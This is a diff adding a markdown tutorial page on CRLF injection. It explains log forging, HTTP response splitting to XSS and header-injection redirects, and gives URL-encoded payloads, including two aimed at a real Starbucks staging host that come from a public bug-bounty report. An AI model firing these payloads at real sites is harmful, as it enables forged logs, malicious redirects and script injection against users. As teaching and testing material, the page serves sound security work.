@@ -1,1 +1,79 @@
+# CRLF
+
+>Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special character sequences used in the HTTP protocol to denote the end of a line or the start of a new one. Web servers and browsers use CRLF to distinguish between HTTP headers and the body of a response. These characters are universally employed in HTTP/1.1 communications across various web server types, such as Apache and Microsoft IIS.
+
+---
+# CRLF Injection Vulnerability
+
+CRLF injection involves the insertion of CR and LF characters into user-supplied input. This action misleads the server, application, or user into interpreting the injected sequence as the end of one response and the beginning of another. While these characters are not inherently harmful, their misuse can lead to HTTP response splitting and other malicious activities.
+
+---
+## Example: CRLF Injection in a Log File
+
+* Consider a log file in an admin panel that follows the format: `IP - Time - Visited Path`. A typical entry might look like:
+
+```url
+123.123.123.123 - 08:15 - /index.php?page=home
+```
+
+* An attacker can exploit a CRLF injection to manipulate this log. By injecting CRLF characters into the HTTP request, the attacker can alter the output stream and fabricate log entries. For instance, an injected sequence might transform the log entry into:
+
+```url
+/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
+```
+
+Here, `%0d` and `%0a` represent the URL-encoded forms of CR and LF. Post-attack, the log would misleadingly display:
+
+`IP - Time - Visited Path
+
+123.123.123.123 - 08:15 - /index.php?page=home&
+127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit`
+
+* The attacker thus cloaks their malicious activities by making it appear as if the localhost (an entity typically trusted within the server environment) performed the actions. The server interprets the part of the query starting with `%0d%0a` as a single parameter, while the `restrictedaction` parameter is parsed as another, separate input. The manipulated query effectively mimics a legitimate administrative command:
+```url
+/index.php?page=home&restrictedaction=edit
+```
+
+---
+## HTTP Response Splitting
+
+#### Description :
+
+>HTTP Response Splitting is a security vulnerability that arises when an attacker exploits the structure of HTTP responses. This structure separates headers from the body using a specific character sequence, Carriage Return (CR) followed by Line Feed (LF), collectively termed as CRLF. If an attacker manages to insert a CRLF sequence into a response header, they can effectively manipulate the subsequent response content. This type of manipulation can lead to severe security issues, notably Cross-site Scripting (XSS).
+
+#### XSS through HTTP Response Splitting
+
+1.  The application sets a custom header like this: `X-Custom-Header: UserInput`
+2.  The application fetches the value for `UserInput` from a query parameter, say "user_input". In scenarios lacking proper input validation and encoding, an attacker can craft a payload that includes the CRLF sequence, followed by malicious content.
+3.  An attacker crafts a URL with a specially crafted 'user_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
+    -   In this URL, `%0d%0a%0d%0a` is the URL-encoded form of CRLFCRLF. It tricks the server into inserting a CRLF sequence, making the server treat the subsequent part as the response body.
+4.  The server reflects the attacker's input in the response header, leading to an unintended response structure where the malicious script is interpreted by the browser as part of the response body.
+
+
+#### An example of HTTP Response Splitting leading to Redirect
+
+From <https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62>
+
+Browser to:
+
+```url
+/%0d%0aLocation:%20http://myweb.com
+```
+
+And the server responses with the header:
+
+```url
+Location: http://myweb.com
+```
+
+```url
+http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+#### In URL Path
+
+You can send the payload **inside the URL path** to control the **response** from the server (example from [here](https://hackerone.com/reports/192667)):
+
+`http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E`
 
